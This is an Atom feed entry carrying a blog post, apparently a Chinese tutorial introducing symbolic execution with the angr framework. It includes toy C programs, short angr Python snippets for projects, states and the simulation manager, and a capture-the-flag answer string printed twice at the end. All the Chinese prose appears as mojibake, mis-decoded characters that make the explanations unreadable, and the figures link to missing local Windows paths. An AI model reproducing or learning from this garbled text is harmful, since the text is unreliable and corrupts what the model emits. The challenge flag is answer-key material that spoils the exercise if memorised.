    <id>https://github.com/xyy9233/xyy9233.github.io.git/2024/02/18/angr_%E7%AC%A6%E5%8F%B7%E6%89%A7%E8%A1%8C%E6%A1%86%E6%9E%B6angr/</id>
    <published>2024-02-17T16:00:00.000Z</published>
    <updated>2024-09-16T07:12:34.418Z</updated>
    
    <content type="html"><![CDATA[<h1 id="ç¬¦å·æ‰§è¡Œæ¡†æ¶"><a href="#ç¬¦å·æ‰§è¡Œæ¡†æ¶" class="headerlink" title="ç¬¦å·æ‰§è¡Œæ¡†æ¶"></a>ç¬¦å·æ‰§è¡Œæ¡†æ¶</h1><h2 id="ç¬¦å·æ‰§è¡Œä»‹ç»"><a href="#ç¬¦å·æ‰§è¡Œä»‹ç»" class="headerlink" title="ç¬¦å·æ‰§è¡Œä»‹ç»"></a>ç¬¦å·æ‰§è¡Œä»‹ç»</h2><p>éšç€æ—¶ä»£çš„å‘å±•ï¼Œç¨‹åºçš„æµç¨‹è¶Šæ¥è¶Šå¤æ‚ï¼Œå¦‚æœæˆ‘ä»¬ç»§ç»­åƒä»¥å‰é‚£æ ·åœ¨ ida é‡Œä»”ç»†åˆ†æï¼Œè‚¯å®šæ˜¯å¤ªç´¯äº†ï¼Œæ‰€ä»¥æœ‰äº›ç§‘å­¦å®¶æƒ³è¦ç”¨è‡ªåŠ¨åŒ–çš„ç®—æ³•æ¥è¿›è¡Œé€†å‘å·¥ç¨‹ï¼Œç„¶åï¼Œä»–ä»¬å°±æå‡ºäº†ç¬¦å·æ‰§è¡Œè¿™ä¸ªç®—æ³•ã€‚</p><p>ç¬¦å·æ‰§è¡Œç®—æ³•å¬èµ·æ¥å¾ˆé«˜ç«¯ï¼Œå…¶å®å†…éƒ¨ç®—æ³•å´å¹¶ä¸éš¾ç†è§£ï¼Œæ¥ä¸‹æ¥å°±ä»‹ç»ä¸€ä¸‹ç¬¦å·æ‰§è¡Œçš„æ ¸å¿ƒç†å¿µã€‚</p><p>å‡å¦‚æœ‰è¿™æ ·ä¸€ä¸ªç¨‹åºï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line"><span class="type">int</span> user_input;</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;user_input);</span><br><span class="line"><span class="keyword">if</span> (user_input - <span class="number">10</span> &gt;= <span class="number">0</span>)</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">&quot;Success&quot;</span>);</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line"><span class="built_in">puts</span>(<span class="string">&quot;Try again&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æˆ‘ä»¬ç°åœ¨æƒ³è¦çŸ¥é“ä¸ºäº†è®©ç¨‹åºåˆ°è¾¾ puts(â€˜Success.â€™) è¿™ä¸€è¡Œï¼Œéœ€è¦çš„è¾“å…¥æ¡ä»¶æ˜¯ä»€ä¹ˆï¼Œé‚£æˆ‘ä»¬è¦æ€ä¹ˆå¾—å‡ºåˆ°è¾¾è¿™ä¸€è¡Œçš„æ¡ä»¶å‘¢ï¼Ÿé¦–å…ˆæˆ‘ä»¬æ¥çœ‹çœ‹æ‰§è¡Œè¿™ä¸ªç¨‹åºçš„æ—¶å€™ï¼Œuser_input éƒ½ç»å†äº†ä»€ä¹ˆã€‚</p><p><img src="C:\Users\17687\AppData\Roaming\Typora\typora-user-images\image-20240216232938209.png" alt="image-20240216232938209"></p><p>user_input ç»è¿‡äº†ä¸€ä¸ªåˆ¤æ–­è¯­å¥ï¼Œå…¶ä¸­ user_input - 10&gt;&#x3D; 0 å°±æ˜¯æˆåŠŸçš„æ¡ä»¶ã€‚æ‰€ä»¥å¾ˆæ˜¾ç„¶ï¼Œæˆ‘ä»¬åª</p><p>è¦å°†è¿™ä¸ªä¸ç­‰å¼è§£å‡ºæ¥ï¼Œå°±èƒ½çŸ¥é“éœ€è¦çš„æ¡ä»¶äº†ã€‚</p><p>é‚£ä¹ˆæ¥ä¸‹æ¥å‡å¦‚è¯´æœ‰ä¸€ä¸ªè¿™æ ·çš„ç¨‹åºå‘¢ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line"><span class="type">int</span> user_input;</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;user_input);</span><br><span class="line"><span class="keyword">if</span> (user_input - <span class="number">10</span> &gt;= <span class="number">0</span>)</span><br><span class="line"><span class="keyword">if</span> (user_input &lt;= <span class="number">20</span>)</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">&quot;Success&quot;</span>);</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line"><span class="built_in">puts</span>(<span class="string">&quot;Try again&quot;</span>);</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line"><span class="built_in">puts</span>(<span class="string">&quot;Try again&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¿™ä¸ªç¨‹åºç¨å¾®å¤æ‚äº†é‚£ä¹ˆä¸€ç‚¹ã€‚ä½†æ˜¯è¿™ä¸æ˜¯é—®é¢˜ï¼Œæˆ‘ä»¬ç…§ç€è§£å†³ä¸Šä¸€ä¸ªç¨‹åºçš„æ–¹æ³•ï¼Œå…ˆçœ‹çœ‹</p><p>user_input éƒ½ç»å†äº†ä»€ä¹ˆï¼š</p><p><img src="C:\Users\17687\AppData\Roaming\Typora\typora-user-images\image-20240216233010717.png" alt="image-20240216233010717"></p><p>ä¸éš¾çœ‹å‡ºï¼Œ user_input ç»å†äº†ä¸ªä¸¤ä¸ªåˆ¤æ–­æ¡ä»¶ï¼Œæ‰€ä»¥è¿™å›æˆ‘ä»¬ä¸ºäº†å¾—å‡ºè¾“å‡ºæˆåŠŸçš„æ¡ä»¶ï¼Œæˆ‘ä»¬å¾—è§£ä¸€</p><p>ä¸ªæ–¹ç¨‹ç»„ï¼š<img src="C:\Users\17687\AppData\Roaming\Typora\typora-user-images\image-20240216233023177.png" alt="image-20240216233023177"></p><p>ä¸éš¾å‘ç°ï¼Œå°±ç®— if è¯­å¥å†å¤šï¼Œåªè¦èƒ½å¤Ÿä¸€ä¸ªä¸ªæ”¶é›†é½å…¨ï¼Œå°†è¿™äº›æ¡ä»¶å½¢æˆä¸€ä¸ªï¼ˆä¸ï¼‰ç­‰å¼ç»„ï¼Œç„¶åè§£å‡º</p><p>è¿™ä¸ªï¼ˆä¸ï¼‰ç­‰å¼ç»„ï¼Œå°±å¯ä»¥å¾—åˆ°æˆ‘ä»¬æƒ³è¦çš„è¾“å‡ºäº†ã€‚</p><p>ä½†æ˜¯ç°å®ç”Ÿæ´»ä¸­çš„ç¨‹åºä¸å¯èƒ½è¿™ä¹ˆç®€å•ï¼Œå•å‡­äººåŠ›æ˜¯æ— æ³•æ”¶é›†å…¨çš„ï¼Œé‚£ä¹ˆæˆ‘ä»¬è‡ªç„¶æ˜¯è¦ç”¨ç¨‹åºæ¥æ”¶é›†ã€‚</p><p>è¿™ä¸ªæ—¶å€™å°±è¯¥æˆ‘ä»¬çš„ angr ç™»åœºäº†ã€‚</p><p>angr ä½œä¸ºä¸€ä¸ªäºŒè¿›åˆ¶åˆ†æçš„å·¥å…·åŒ…ï¼Œä½†å®ƒé€šå¸¸ä½œä¸ºç¬¦å·æ‰§è¡Œå·¥å…·æ›´ä¸ºå‡ºåã€‚</p><p>ç¬¦å·æ‰§è¡Œå°±æ˜¯ç»™ç¨‹åºä¼ é€’ä¸€ä¸ªç¬¦å·è€Œä¸æ˜¯å…·ä½“çš„å€¼ï¼Œè®©è¿™ä¸ªç¬¦å·ä¼´éšç¨‹åºè¿è¡Œï¼Œå½“ç¢°è§åˆ†æ”¯æ—¶ï¼Œç¬¦å·ä¼š</p><p>è¿›å…¥å“ªä¸ªåˆ†æ”¯å‘¢ï¼Ÿ</p><p>angr çš„å›ç­”æ˜¯å…¨éƒ½è¿›å…¥ã€‚angr ä¼šä¿å­˜æ‰€æœ‰åˆ†æ”¯ï¼Œä»¥åŠåˆ†æ”¯åçš„æ‰€æœ‰åˆ†æ”¯ï¼Œå¹¶ä¸”åœ¨åˆ†æ”¯æ—¶ï¼Œä¿å­˜è¿›å…¥è¯¥</p><p>åˆ†æ”¯æ—¶çš„åˆ¤æ–­æ¡ä»¶ï¼Œé€šå¸¸è¿™äº›åˆ¤æ–­æ¡ä»¶æ—¶å¯¹ç¬¦å·çš„çº¦æŸã€‚</p><p>å½“ angr è¿è¡Œåˆ°ç›®æ ‡çŠ¶æ€æ—¶ï¼Œå°±å¯ä»¥è°ƒç”¨æ±‚è§£å™¨å¯¹ä¸€è·¯ä¸Šæ”¶é›†åˆ°çš„çº¦æŸè¿›è¡Œæ±‚è§£ï¼Œæœ€ç»ˆå¾—åˆ°æŸä¸ªç¬¦å·èƒ½</p><p>å¤Ÿåˆ°è¾¾å½“å‰çŠ¶æ€çš„å€¼ã€‚</p><h2 id="angr-æ ¸å¿ƒæ¦‚å¿µ"><a href="#angr-æ ¸å¿ƒæ¦‚å¿µ" class="headerlink" title="angr æ ¸å¿ƒæ¦‚å¿µ"></a><strong>angr</strong> <strong>æ ¸å¿ƒæ¦‚å¿µ</strong></h2><h3 id="é¡¶å±‚æ¥å£"><a href="#é¡¶å±‚æ¥å£" class="headerlink" title="é¡¶å±‚æ¥å£"></a><strong>é¡¶å±‚æ¥å£</strong></h3><p>Project ç±»æ˜¯ angr çš„ä¸»ç±»ï¼Œä¹Ÿæ˜¯ angr çš„å¼€å§‹ï¼Œé€šè¿‡åˆå§‹åŒ–è¯¥ç±»çš„å¯¹è±¡ï¼Œå¯ä»¥å°†ä½ æƒ³è¦åˆ†æçš„äºŒè¿›åˆ¶æ–‡</p><p>ä»¶åŠ è½½è¿›æ¥ï¼Œå°±åƒè¿™æ ·ï¼š</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> angr</span><br><span class="line">p = angr.Project(<span class="string">&quot;./test&quot;</span>)</span><br></pre></td></tr></table></figure><p>å‚æ•°ä¸ºå¾…åˆ†æçš„æ–‡ä»¶è·¯å¾„ï¼Œå®ƒæ˜¯å”¯ä¸€å¿…é¡»ä¼ å…¥çš„å‚æ•°ï¼Œæ­¤å¤–è¿˜æœ‰ä¸€ä¸ªæ¯”è¾ƒå¸¸ç”¨çš„å‚æ•° load-optionsï¼Œå®ƒ</p><p>æŒ‡æ˜åŠ è½½çš„æ–¹å¼ï¼Œå¦‚ä¸‹</p><p><img src="C:\Users\17687\AppData\Roaming\Typora\typora-user-images\image-20240216233058337.png" alt="image-20240216233058337"></p><p><img src="C:\Users\17687\AppData\Roaming\Typora\typora-user-images\image-20240216233105524.png" alt="image-20240216233105524"></p><h3 id="State"><a href="#State" class="headerlink" title="State"></a><strong>State</strong></h3><p>Project å®é™…ä¸Šåªæ˜¯å°†äºŒè¿›åˆ¶æ–‡ä»¶åŠ è½½è¿›æ¥äº†ï¼Œè¦æ‰§è¡Œå®ƒï¼Œå®é™…ä¸Šæ˜¯å¯¹ SimState å¯¹è±¡è¿›è¡Œæ“ä½œï¼Œå®ƒæ˜¯ç¨‹</p><p>åºçš„çŠ¶æ€ã€‚</p><p>è¦åˆ›å»ºçŠ¶æ€ï¼Œéœ€è¦ä½¿ç”¨ Project å¯¹è±¡ä¸­çš„ factoryï¼Œå®ƒè¿˜å¯ä»¥ç”¨äºåˆ›å»ºæ¨¡æ‹Ÿç®¡ç†å™¨å’ŒåŸºæœ¬å—ï¼Œå¦‚ä¸‹ï¼š</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">state = p.factory.entry_state()</span><br></pre></td></tr></table></figure><p>é¢„è®¾çŠ¶æ€æœ‰å››ç§æ–¹å¼å¦‚ä¸‹ï¼š</p><p><img src="C:\Users\17687\AppData\Roaming\Typora\typora-user-images\image-20240216233150939.png" alt="image-20240216233150939"></p><p>çŠ¶æ€åŒ…å«äº†ç¨‹åºè¿è¡Œæ—¶çš„ä¸€åˆ‡ä¿¡æ¯ï¼Œå¯„å­˜å™¨ã€å†…å­˜çš„å€¼ã€æ–‡ä»¶ç³»ç»Ÿä»¥åŠ<strong>ç¬¦å·å˜é‡</strong>ç­‰ï¼Œè¿™äº›ä¿¡æ¯çš„ä½¿ç”¨ç­‰</p><p>ç”¨åˆ°æ—¶å†è¿›ä¸€æ­¥è¯´æ˜ã€‚</p><p>entry_state å’Œ blank_state æ˜¯å¸¸ç”¨çš„ä¸¤ç§æ–¹å¼ï¼Œåè€…é€šå¸¸ç”¨äºè·³è¿‡ä¸€äº›æå¤§é™ä½ angr æ•ˆç‡çš„æŒ‡ä»¤ï¼Œå®ƒ</p><p>ä»¬é—´çš„å¯¹æ¯”å¦‚ä¸‹ï¼š</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt; state = p.factory.entry_state()</span><br><span class="line">&gt;&gt;&gt; <span class="built_in">print</span>(state.regs.rax, state.regs.rip)</span><br><span class="line">&lt;BV64 <span class="number">0</span>x1c&gt; &lt;BV64 <span class="number">0</span>x4023c0&gt;</span><br><span class="line">&gt;&gt;&gt; state = p.factory.blank_state(addr=<span class="number">0</span>x4023c0)</span><br><span class="line">&gt;&gt;&gt; <span class="built_in">print</span>(state.regs.rax, state.regs.rip)</span><br><span class="line">&lt;BV64 reg_rax_42_64&#123;UNINITIALIZED&#125;&gt; &lt;BV64 <span class="number">0</span>x4023c0&gt;</span><br></pre></td></tr></table></figure><p>åœ¨ blank_state æ–¹å¼ä¸­ï¼Œæˆ‘ä»¬ä»å°†åœ°å€è®¾å®šä¸ºç¨‹åºçš„å…¥å£ç‚¹ï¼Œç„¶è€Œ rax ä¸­çš„å€¼ç”±äºæ²¡æœ‰åˆå§‹åŒ–ï¼Œå®ƒç°åœ¨</p><p>æ˜¯ä¸€ä¸ªåå­—ï¼Œä¹Ÿå³ç¬¦å·å˜é‡ï¼Œè¿™æ˜¯ç¬¦å·æ‰§è¡Œçš„åŸºç¡€ã€‚æ­¤å¤–ï¼Œå¯ä»¥çœ‹åˆ°å¯„å­˜å™¨ä¸­çš„æ•°æ®ç±»å‹å¹¶ä¸æ˜¯ intï¼Œ</p><p>è€Œæ˜¯ BV64ï¼Œå®ƒæ˜¯ä¸€ä¸ªä½å‘é‡ï¼ˆBit Vectorï¼‰ã€‚</p><h3 id="Simulation-Manager"><a href="#Simulation-Manager" class="headerlink" title="Simulation Manager"></a><strong>Simulation Manager</strong></h3><p>ä¸Šè¿°æ–¹å¼åªæ˜¯é¢„è®¾äº†ç¨‹åºå¼€å§‹åˆ†ææ—¶çš„çŠ¶æ€ï¼Œæˆ‘ä»¬è¦åˆ†æç¨‹åºå°±å¿…é¡»è¦è®©å®ƒåˆ°è¾¾ä¸‹ä¸€ä¸ªçŠ¶æ€ï¼Œè¿™å°±éœ€è¦</p><p>æ¨¡æ‹Ÿç®¡ç†å™¨çš„å¸®åŠ©ï¼ˆç®€ç§° SMï¼‰ã€‚</p><p>ä½¿ç”¨ä»¥ä¸‹æŒ‡ä»¤èƒ½åˆ›å»ºä¸€ä¸ª SMï¼Œå®ƒéœ€è¦ä¼ å…¥ä¸€ä¸ª state æˆ–è€… state çš„åˆ—è¡¨ä½œä¸ºå‚æ•°ï¼š</p><p><img src="C:\Users\17687\AppData\Roaming\Typora\typora-user-images\image-20240216233228867.png" alt="image-20240216233228867"></p><p>é»˜è®¤æƒ…å†µä¸‹ï¼Œstate ä¼šè¢«å­˜æ”¾åœ¨ active ä¸­ã€‚</p><p>å¯ä»¥é€šè¿‡ step() æ–¹æ³•æ¥è®©å¤„äº active çš„ state æ‰§è¡Œä¸€ä¸ªåŸºæœ¬å—ï¼Œè¿™ç§æ“ä½œä¸ä¼šæ”¹å˜ state æœ¬èº«ï¼ˆç±»æ¯”</p><p>dockerï¼‰ï¼š<img src="C:\Users\17687\AppData\Roaming\Typora\typora-user-images\image-20240216233245331.png" alt="image-20240216233245331"></p><h3 id="Explorer"><a href="#Explorer" class="headerlink" title="Explorer"></a><strong>Explorer</strong></h3><p>å¯ä»¥ä½¿ç”¨ explorer æ–¹æ³•å»æ‰§è¡ŒæŸä¸ªçŠ¶æ€ï¼Œç›´åˆ°æ‰¾åˆ°ç›®æ ‡æŒ‡ä»¤æˆ–è€… active ä¸­æ²¡æœ‰çŠ¶æ€ä¸ºæ­¢ï¼Œå®ƒæœ‰å¦‚ä¸‹å‚</p><p>æ•°ï¼š</p><p>findï¼šä¼ å…¥ç›®æ ‡æŒ‡ä»¤çš„åœ°å€æˆ–åœ°å€åˆ—è¡¨ï¼Œæˆ–è€…ä¸€ä¸ªç”¨äºåˆ¤æ–­çš„å‡½æ•°</p><p>avoidï¼šä¼ å…¥è¦é¿å…çš„æŒ‡ä»¤çš„åœ°å€æˆ–åœ°å€åˆ—è¡¨ï¼Œæˆ–è€…ä¸€ä¸ªç”¨äºåˆ¤æ–­çš„å‡½æ•°ï¼Œç”¨äºå‡å°‘è·¯å¾„</p><p>angr ä¼šæ²¿ç€åˆ†æ”¯æŒ‰ç…§æŸç§ç­–ç•¥ï¼ˆé»˜è®¤DFSï¼‰è¿›è¡ŒçŠ¶æ€æœç´¢ï¼Œå½“è¾¾åˆ°ç›®æ ‡çŠ¶æ€æ—¶ï¼Œä½¿ç”¨çº¦æŸæ±‚è§£å™¨</p><p>ï¼ˆclaripyï¼‰å¯¹æ”¶é›†åˆ°çš„çº¦æŸè¿›è¡Œæ±‚è§£ã€‚</p><p>å› æ­¤ï¼Œä½¿ç”¨ angr ä¸€èˆ¬åˆ†ä¸ºå¦‚ä¸‹æ­¥éª¤ï¼š</p><p>\1. åˆ›å»º Projectï¼Œé¢„è®¾ state</p><p>\2. åˆ›å»ºä½å‘é‡å’Œç¬¦å·å˜é‡ï¼Œä¿å­˜åœ¨å†…å­˜&#x2F;å¯„å­˜å™¨&#x2F;æ–‡ä»¶æˆ–å…¶ä»–åœ°æ–¹</p><p>\3. å°† state æ·»åŠ åˆ° SM ä¸­</p><p>\4. è¿è¡Œï¼Œæ¢ç´¢æ»¡è¶³æ¡ä»¶çš„è·¯å¾„</p><p>\5. çº¦æŸæ±‚è§£è·å–æ‰§è¡Œç»“æœ</p><h2 id="angr-å…¥é—¨ç»ƒä¹ "><a href="#angr-å…¥é—¨ç»ƒä¹ " class="headerlink" title="angr å…¥é—¨ç»ƒä¹ "></a><strong>angr</strong> <strong>å…¥é—¨ç»ƒä¹ </strong></h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pearl&#123;d1d_y0u_aut0m4t3_0r_4r3_y0u_h4rdw0rk1ng_?&#125;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pearl&#123;d1d_y0u_aut0m4t3_0r_4r3_y0u_h4rdw0rk1ng_?&#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;ç¬¦å·æ‰§è¡Œæ¡†æ¶&quot;&gt;&lt;a href=&quot;#ç¬¦å·æ‰§è¡Œæ¡†æ¶&quot; class=&quot;headerlink&quot; title=&quot;ç¬¦å·æ‰§è¡Œæ¡†æ¶&quot;&gt;&lt;/a&gt;ç¬¦å·æ‰§è¡Œæ¡†æ¶&lt;/h1&gt;&lt;h2 id=&quot;ç¬¦å·æ‰§è¡Œä»‹ç»&quot;&gt;&lt;a href=&quot;#ç¬¦å·æ‰§è¡Œä»‹ç»&quot; class=&quot;headerlink&quot; titl</summary>
      
    
    
    
    
    <category term="RE angr" scheme="https://github.com/xyy9233/xyy9233.github.io.git/tags/RE-angr/"/>
    
  </entry>
  
</feed>
